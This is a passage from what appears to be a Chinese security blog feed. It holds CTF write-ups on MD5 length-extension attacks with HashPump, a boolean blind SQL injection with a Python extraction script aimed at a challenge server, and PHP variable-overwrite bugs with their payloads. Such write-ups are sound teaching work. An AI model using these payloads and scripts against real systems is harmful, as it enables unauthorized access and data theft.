    <published>2018-07-09T16:00:00.000Z</published>
    <updated>2018-07-10T12:42:10.513Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-MD5加密原理"><a href="#0x01-MD5加密原理" class="headerlink" title="0x01 MD5加密原理"></a>0x01 MD5加密原理</h2><p>简单介绍下分成下面几步</p><ul><li>分组,先将二进制字符串以512位(64字节)为一组，然后再把每组分为16个子分组(每子分组32位，也就是4字节)<a id="more"></a></li><li><p>填充，分两步填N<em>64+56字节,填充规则是，二进制的话是先填充一个1，后面全填为0，十六进制是先填充一个8，后面全填0,直到长度满足N</em>64+56</p></li><li><p>第二步的填充:再填充8字节，这样最后的数据就是（N+1）*64字节。</p></li><li><p>接下来假设原始为abcd，对一个分组的子分组进行一系列神奇的运算，得出新的abcd，然后这个新的abcd又和下一个分组进行神奇的运算，以此类推，最后就会得出一个128位加密后的值，用16进制来表示也就是我们看到的32位的md5。</p></li></ul><h2 id="0x02-加盐-salt-原理"><a href="#0x02-加盐-salt-原理" class="headerlink" title="0x02 加盐(salt)原理"></a>0x02 加盐(salt)原理</h2><p>管理员把用户密码的md5值存储在数据库，但攻击者常常把一些常用字符串生成md5字典，通过比较网站数据库密码的md5值得到真正的密码。为了加强安全，管理员又通过加盐（salt）的方式来存储密码数据，具体措施是自定义一个字符串，这个字符串谁都看不到。当用户进行注册的时候，把md5（salt+密码）的值进行存储，以后用户每次登陆都在后台把用户输入的密码加盐再md5加密与数据库进行比较。这样攻击者不知道盐是什么，很难通过爆破的方式来获取密码。</p><h2 id="0x02-MD5长度扩展攻击原理"><a href="#0x02-MD5长度扩展攻击原理" class="headerlink" title="0x02 MD5长度扩展攻击原理"></a>0x02 MD5长度扩展攻击原理</h2><p>哈希长度扩展攻击<br>hash的MD5对数据进行加密的时候，是分组进行加密。</p><p>MD5加密的时候会有四个初始向量IV，对第一组数据加密的时候利用的就是四个初始向量，不同的是，在对第二组数据进行加密的时候，使用的并不是四个初始向量，而是将前一组加密后的密文作为下一组的初始向量。</p><p>哈希长度扩展攻击便是利用这个特性来实现的。</p><h3 id="扩展攻击实现的条件"><a href="#扩展攻击实现的条件" class="headerlink" title="扩展攻击实现的条件"></a>扩展攻击实现的条件</h3><ul><li>知道Salt的长度</li><li>要知道一个由salt加密后的md5值</li><li>知道$data的值(未加盐的明文)</li></ul><h2 id="0x03-简单的md5长度扩展攻击题"><a href="#0x03-简单的md5长度扩展攻击题" class="headerlink" title="0x03 简单的md5长度扩展攻击题"></a>0x03 简单的md5长度扩展攻击题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;secret.php&quot;;</span><br><span class="line">@$username=(string)$_POST[&apos;username&apos;];</span><br><span class="line">function enc($text)&#123;</span><br><span class="line">    global $key;</span><br><span class="line">    return md5($key.$text);</span><br><span class="line">&#125;</span><br><span class="line">if(enc($username) === $_COOKIE[&apos;verify&apos;])&#123;</span><br><span class="line">    if(is_numeric(strpos($username, &quot;admin&quot;)))&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;you are not admin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7);</span><br><span class="line">    setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure><p>从源码可以得到以下内容:<br></p><ul><li>enc(“guest”)的值为78cfc57d983b4a17e55828c001a3e781</li><li>$key的长度为46</li></ul><p>题目的关键代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(enc($username) === $_COOKIE[&apos;verify&apos;])&#123;</span><br><span class="line">    if(is_numeric(strpos($username, &quot;admin&quot;)))&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>这段代码要求我们输入的username在经过enc函数加密之后，与$_COOKIE[‘verify’]的值相等，并且username中必须含有admin。</p><p>看到这里，我们就可以想到来利用哈希长度扩展来帮我们解决这个问题。</p><p>而且题目给予我们的信息，刚好满足哈希长度扩展攻击的要求。</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>这里我们使用HashPump这个工具</p><p>安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line">cd HashPump</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></p><p>使用说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 已知的hash值，这里是$_COOKIE[&apos;verify&apos;]的值</span><br><span class="line">Input Data: 上面的hash值解密后的字符串，这里是guest。</span><br><span class="line">Input Key Length: $key的长度</span><br><span class="line">Input Data to Add: 想要添加的数据，由于题目要求要含有admin，所以这里是admin。</span><br></pre></td></tr></table></figure></p><p>使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  HashPump hashpump</span><br><span class="line">Input Signature: 78cfc57d983b4a17e55828c001a3e781</span><br><span class="line">Input Data: guest</span><br><span class="line">Input Key Length: 46</span><br><span class="line">Input Data to Add: admin</span><br><span class="line">5f585093a7fe86971766c3d25c43d0eb</span><br><span class="line">guest\x80\x00\x00\x00\x00\x98\x01\x00\x00\x00\x00\x00\x00admin</span><br></pre></td></tr></table></figure></p><p>然后我们将得到的hash值去替换数据包中$_COOKIE[‘verify’]的值，然后post提交username=guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin即可。</p><h2 id="0x04-序列化md5长度扩展攻击题"><a href="#0x04-序列化md5长度扩展攻击题" class="headerlink" title="0x04 序列化md5长度扩展攻击题"></a>0x04 序列化md5长度扩展攻击题</h2><p>此题来自jarvis oj flag在管理员手中吗?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 350&lt;/title&gt;</span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">                background:gray;</span><br><span class="line">                text-align:center;</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">                $auth = false;</span><br><span class="line">                $role = &quot;guest&quot;;</span><br><span class="line">                $salt =</span><br><span class="line">                if (isset($_COOKIE[&quot;role&quot;])) &#123;</span><br><span class="line">                        $role = unserialize($_COOKIE[&quot;role&quot;]);//要先将cookie里的role序列化</span><br><span class="line">                        $hsh = $_COOKIE[&quot;hsh&quot;];</span><br><span class="line">                        if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) &#123; //需要先提前把cookie里的role取反</span><br><span class="line">                                $auth = true;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">                                $auth = false;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                        $s = serialize($role);</span><br><span class="line">                        setcookie(&apos;role&apos;,$s);</span><br><span class="line">                        $hsh = md5($salt.strrev($s));</span><br><span class="line">                        setcookie(&apos;hsh&apos;,$hsh);</span><br><span class="line">                &#125;</span><br><span class="line">                if ($auth) &#123;</span><br><span class="line">                        echo &quot;&lt;h3&gt;Welcome Admin. Your flag is </span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                        echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line">        </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这个比上一题复杂了多，有两个难点:</p><ul><li>不知道salt的长度</li><li>序列化问题</li></ul><p>序列化问题自己搭环境写,比如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$s = &apos;guest&apos;;</span><br><span class="line">$b= serialize($s);</span><br><span class="line">print(strrev($b)); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>salt的长度一个个蒙，不过写脚本比较简便，前提是你有代码能力</p><p>网上看到的有脚本的wp链接，<a href="https://cloud.tencent.com/developer/article/1038017" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1038017</a></p><p>然后上HashPump工具<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: 3a4727d57463f122833d9e732f94e4e0</span><br><span class="line">Input Data: ;&quot;tseug&quot;:5:s</span><br><span class="line">Input Key Length: 12</span><br><span class="line">Input Data to Add: ;&quot;nimda&quot;:5:s</span><br><span class="line">fcdc3840332555511c4e4323f6decb07</span><br><span class="line">;&quot;tseug&quot;:5:s\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00;&quot;nimda&quot;:5:s</span><br></pre></td></tr></table></figure></p><p>替换cookie即可得到flags<br><img src="http://p1vrkwaxt.bkt.clouddn.com/ZAJS1EBONWTLIS74RJE2W7M.png" alt="image"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-MD5加密原理&quot;&gt;&lt;a href=&quot;#0x01-MD5加密原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 MD5加密原理&quot;&gt;&lt;/a&gt;0x01 MD5加密原理&lt;/h2&gt;&lt;p&gt;简单介绍下分成下面几步&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;分组,先将二进制字符串以512位(64字节)为一组，然后再把每组分为16个子分组(每子分组32位，也就是4字节)
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基于布尔盲注的学习笔记</title>
    <link href="http://yoursite.com/2018/07/06/%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E7%9A%84SQL/"/>
    <id>http://yoursite.com/2018/07/06/基于布尔盲注的SQL/</id>
    <published>2018-07-06T05:24:35.632Z</published>
    <updated>2018-07-06T10:30:53.660Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<a href="https://blog.csdn.net/squeen_/article/details/52767887" target="_blank" rel="noopener">https://blog.csdn.net/squeen_/article/details/52767887</a></p><p>这里引用的是iscc的一道sql盲注题</p><a id="more"></a><h2 id="Iscc-web-Sqli"><a href="#Iscc-web-Sqli" class="headerlink" title="Iscc web Sqli"></a>Iscc web Sqli</h2><p>一道比较简单的布尔盲注题<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/L3V%25_%5BWHV%287%5BP%25~Q%7B%7BC3QL0.png" alt="image"></p><ul><li>首先找到注入点,测试是否为布尔盲注:<br></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;  // 返回账号密码错误&lt;br&gt;</span><br><span class="line">admin&apos; and 1 =1# //返回normal user: admin&apos; and 1 =1#</span><br></pre></td></tr></table></figure><p>密码随意</p><p>多次测试就两种结果，账号密码错误和normal user,可以推断这是一个布尔盲注题</p><h2 id="布尔盲注步骤"><a href="#布尔盲注步骤" class="headerlink" title="布尔盲注步骤"></a>布尔盲注步骤</h2><p>这里详细讲下盲注语句步骤:</p><h3 id="一、得到数据库的长度"><a href="#一、得到数据库的长度" class="headerlink" title="一、得到数据库的长度"></a>一、得到数据库的长度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and length(database())&gt;1# //长度为13</span><br></pre></td></tr></table></figure><h3 id="二、得到数据库的名称"><a href="#二、得到数据库的名称" class="headerlink" title="二、得到数据库的名称"></a>二、得到数据库的名称</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and ascii(substr(database(),1,1))&gt;1# // sqli_database</span><br></pre></td></tr></table></figure><p>这个和后面都要用脚本跑一下，脚本会在后面放出</p><h3 id="三、得到表名"><a href="#三、得到表名" class="headerlink" title="三、得到表名"></a>三、得到表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;1# //news,user</span><br></pre></td></tr></table></figure><h3 id="四、得到字段名"><a href="#四、得到字段名" class="headerlink" title="四、得到字段名"></a>四、得到字段名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;news&apos;),1,1))&gt;1#</span><br></pre></td></tr></table></figure><h3 id="五、得到字段的内容"><a href="#五、得到字段的内容" class="headerlink" title="五、得到字段的内容"></a>五、得到字段的内容</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and ascii(substr((select group_concat(kjafuibafuohnuvwnruniguankacbh) from sqli_database.news),1,1))&gt;1#</span><br></pre></td></tr></table></figure><h3 id="python脚本获取"><a href="#python脚本获取" class="headerlink" title="python脚本获取"></a>python脚本获取</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &apos;http://118.190.152.202:8011/&apos;</span><br><span class="line"></span><br><span class="line">def test(num,asc):</span><br><span class="line"># data = &#123;&apos;username&apos;: &apos;admin\&apos; and ascii(substr(database(),%s,1))&gt;%s#&apos;%(num,asc),&apos;password&apos;:&apos;111&apos;&#125; //sqli_database</span><br><span class="line">    # data = &#123;&apos;username&apos;: &apos;admin\&apos; and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%s,1))&gt;%s#&apos;%(num,asc),&apos;password&apos;:&apos;111&apos;&#125;//news,user</span><br><span class="line">    # data = &#123;&apos;username&apos;: &apos;admin\&apos; and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\&apos;news\&apos;),%s,1))&gt;%s#&apos;%(num,asc),&apos;password&apos;:&apos;111&apos;&#125;//</span><br><span class="line">data = &#123;&apos;username&apos;: &apos;admin\&apos; and ascii(substr((select group_concat(kjafuibafuohnuvwnruniguankacbh) from sqli_database.news ),%s,1))&gt;%s#&apos;%(num,asc),&apos;password&apos;:&apos;111&apos;&#125;</span><br><span class="line">r = requests.post(url,data=data)</span><br><span class="line">if &apos;normal&apos; in r.text:</span><br><span class="line">return 1</span><br><span class="line">else:</span><br><span class="line">return 0</span><br><span class="line"></span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for num in range(0,100):</span><br><span class="line">for asc in range(0,255):</span><br><span class="line">get = test(num,asc)</span><br><span class="line">if get == 0:</span><br><span class="line">flag += chr(asc)</span><br><span class="line">print(flag)</span><br><span class="line">break</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考链接:&lt;a href=&quot;https://blog.csdn.net/squeen_/article/details/52767887&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.csdn.net/squeen_/article/details/52767887&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里引用的是iscc的一道sql盲注题&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>代码审计|变量覆盖漏洞</title>
    <link href="http://yoursite.com/2018/07/06/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2018/07/06/变量覆盖漏洞/</id>
    <published>2018-07-06T05:24:35.632Z</published>
    <updated>2018-07-06T10:40:26.804Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<a href="http://www.freebuf.com/column/150731.html" target="_blank" rel="noopener">http://www.freebuf.com/column/150731.html</a></p><h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用自定义的参数值替换原有变量值的情况称为变量覆盖漏洞</span><br></pre></td></tr></table></figure><a id="more"></a><p>经常导致变量覆盖漏洞场景有：$$使用不当，extract()函数使用不当，parse_str()函数使用不当，import_request_variables()使用不当，开启了全局变量注册等。 </p><p>下面讲解一下CTF的几个例题</p><h2 id="0x02-导致变量覆盖漏洞"><a href="#0x02-导致变量覆盖漏洞" class="headerlink" title="0x02 $$ 导致变量覆盖漏洞"></a>0x02 $$ 导致变量覆盖漏洞</h2><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$name=’thinking’;</span><br><span class="line">foreach ($_GET as $key =&gt; $value)</span><br><span class="line">$$key = $value;</span><br><span class="line">var_dump($key);</span><br><span class="line">print(&apos;&lt;br&gt;&apos;);</span><br><span class="line">var_dump($value);</span><br><span class="line">print(&apos;&lt;br&gt;&apos;);</span><br><span class="line">var_dump($$key);</span><br><span class="line">print(&apos;&lt;br&gt;&apos;);</span><br><span class="line">echo $name;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>$$ 导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现,用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。请求?name=test 会将$name的值覆盖，变为test。</p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/T%5DL%7DE51HC%29EDE91OK~%255%29JL.png" alt="image"></p><h2 id="0x03-例题"><a href="#0x03-例题" class="headerlink" title="0x03 $$ 例题"></a>0x03 $$ 例题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$_403 = ‘Hello’;</span><br><span class="line">$_200 = ‘HEEEE’;</span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] != “POST”)</span><br><span class="line">    die(‘BABABA’);</span><br><span class="line">if ( !isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">    die($_403);</span><br><span class="line">foreach ($_GET as $key =&gt; $value) </span><br><span class="line">    $$key = $$value;</span><br><span class="line">foreach ($_POST as $key =&gt; $value)</span><br><span class="line">    $$key = $value;</span><br><span class="line">if ( $_POST[&quot;flag&quot;] !== $flag )</span><br><span class="line">    die($_403);</span><br><span class="line">echo “This is your flag : “. $flag . “\n”;</span><br><span class="line">die($_200);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>构造的payload如图:<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/08%60RPTG%7B~ZIBE%7DKS9TKLH9Q.png" alt="image"></p><p>根据这个payload传入两个foreach两个流程就是:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_200=$flag //把原来的值给覆盖了</span><br><span class="line">$flag=aaaaaaaaaaa //符合只后的等于post</span><br></pre></td></tr></table></figure></p><h2 id="0x04-extract-函数"><a href="#0x04-extract-函数" class="headerlink" title="0x04 extract()函数"></a>0x04 extract()函数</h2><p>extract() 函数从数组中将变量导入到当前的符号表。<br><br><a href="http://www.w3school.com.cn/php/func_array_extract.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_array_extract.asp</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = ‘xxx’;</span><br><span class="line">extract($_GET);</span><br><span class="line">if (isset($gift)) &#123;</span><br><span class="line">    $content = trim(file_get_contents($flag));</span><br><span class="line">    if ($gift == $content) &#123;</span><br><span class="line">        echo ‘hctf&#123;…&#125;’;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo ‘Oh..’;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="代码审计分析"><a href="#代码审计分析" class="headerlink" title="代码审计分析"></a>代码审计分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目使用了extract($_GET)接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用extract()对变量进行覆盖，从而满足各个条件。</span><br></pre></td></tr></table></figure><p>构造get的payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=&amp;gift=</span><br></pre></td></tr></table></figure><h2 id="0x05-parse-str-函数"><a href="#0x05-parse-str-函数" class="headerlink" title="0x05 parse_str()函数"></a>0x05 parse_str()函数</h2><p>parse_str() 函数把查询字符串解析到变量中。<br><br><a href="http://www.w3school.com.cn/php/func_string_parse_str.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_string_parse_str.asp</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (empty($_GET[&apos;id&apos;])) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    include (‘flag.php’);</span><br><span class="line">    $a = “www.OPENCTF.com”;</span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    @parse_str($id);</span><br><span class="line">    if ($a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        exit(‘其实很简单其实并不难！’);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><ul><li>通过parse_str函数可将$a变量覆盖</li><li>md5函数 0e开头绕过</li></ul><p>构造的payload为:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=a[0]=s878926199a</span><br></pre></td></tr></table></figure></p><h2 id="0x06-import-request-variables-函数"><a href="#0x06-import-request-variables-函数" class="headerlink" title="0x06 import_request_variables()函数"></a>0x06 import_request_variables()函数</h2><p>将GET/POST/Cookie变量导入到全局作用域中</p><p>bool import_request_variables(string $types[, string $prefix])</p><p>types:指定需要导入的变量，可以用’G’,’P’和’C’表示GET,POST和Cookie.<br>prefix作为变量名的前缀，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$auth=&apos;0&apos;;</span><br><span class="line">import_request_variable();</span><br><span class="line"></span><br><span class="line">if($auth == 1)&#123;</span><br><span class="line">    echo &quot;private!&quot;;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    echo &quot;public&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>构造payload:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?auth=1</span><br></pre></td></tr></table></figure></p><p>会输出private,说明已经成功覆盖原来的0了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>没啥好总结的，多看代码多学习多分析.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考链接:&lt;a href=&quot;http://www.freebuf.com/column/150731.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.freebuf.com/column/150731.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-原理&quot;&gt;&lt;a href=&quot;#0x01-原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 原理&quot;&gt;&lt;/a&gt;0x01 原理&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;用自定义的参数值替换原有变量值的情况称为变量覆盖漏洞&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CTF常见文件头标志</title>
    <link href="http://yoursite.com/2018/07/06/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4/"/>
    <id>http://yoursite.com/2018/07/06/常见文件头/</id>
    <published>2018-07-06T05:24:35.632Z</published>
    <updated>2018-07-06T10:36:24.477Z</updated>
    
